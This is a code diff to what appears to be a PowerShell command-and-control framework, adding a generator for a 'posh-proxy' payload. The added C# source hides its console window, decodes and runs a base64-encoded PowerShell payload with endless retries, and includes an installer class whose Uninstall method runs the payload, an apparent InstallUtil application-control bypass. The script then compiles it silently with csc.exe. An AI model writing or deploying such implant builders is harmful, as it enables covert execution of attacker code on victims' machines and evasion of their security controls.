@@ -466,6 +466,101 @@ primer | iex
         }
     }
     Write-Host -Object "Payload written to: $FolderPath\payloads\posh-proxy-service.exe"  -ForegroundColor Green
+
+
+    $csccode = 'using System;
+using System.Text;
+using System.Diagnostics;
+using System.Reflection;
+using System.Configuration.Install;
+using System.Runtime.InteropServices;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+public class Program
+    {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        public const int SW_HIDE = 0;
+        public const int SW_SHOW = 5;
+
+        public static string InvokeAutomation(string cmd)
+        {
+            Runspace newrunspace = RunspaceFactory.CreateRunspace();
+            newrunspace.Open();
+            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
+            Pipeline pipeline = newrunspace.CreatePipeline();
+
+            pipeline.Commands.AddScript(cmd);
+            Collection<PSObject> results = pipeline.Invoke();
+            newrunspace.Close();
+
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject obj in results)
+            {
+                stringBuilder.Append(obj);
+            }
+            return stringBuilder.ToString().Trim();
+        }
+        public static void Main()
+        {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+            try
+            {
+                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
+                InvokeAutomation(tt);
+            }
+            catch
+            {
+                Main();
+            }
+        }
+        
+}
+    
+[System.ComponentModel.RunInstaller(true)]
+public class Sample : System.Configuration.Install.Installer
+{
+    public override void Uninstall(System.Collections.IDictionary savedState)
+    {
+        Program.Main();       
+    }
+    public static string InvokeAutomation(string cmd)
+    {
+        Runspace newrunspace = RunspaceFactory.CreateRunspace();
+        newrunspace.Open();
+        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
+        Pipeline pipeline = newrunspace.CreatePipeline();
+
+        pipeline.Commands.AddScript(cmd);
+        Collection<PSObject> results = pipeline.Invoke();
+        newrunspace.Close();
+
+        StringBuilder stringBuilder = new StringBuilder();
+        foreach (PSObject obj in results)
+        {
+            stringBuilder.Append(obj);
+        }
+        return stringBuilder.ToString().Trim();
+    }
+}'
+
+    [IO.File]::WriteAllLines("$FolderPath\payloads\posh-proxy.cs", $csccode)
+
+    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
+        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy.exe $FolderPath\payloads\posh-proxy.cs /reference:$PoshPath\System.Management.Automation.dll"
+    } else {
+        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
+            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy.exe $FolderPath\payloads\posh-proxy.cs /reference:$PoshPath\System.Management.Automation.dll"
+        }
+    }
+    Write-Host -Object "Payload written to: $FolderPath\payloads\posh-proxy.exe"  -ForegroundColor Green
+
     }
 function Invoke-DaisyChain {
 param($port, $daisyserver, $c2server, $c2port, $domfront, $proxyurl, $proxyuser, $proxypassword)
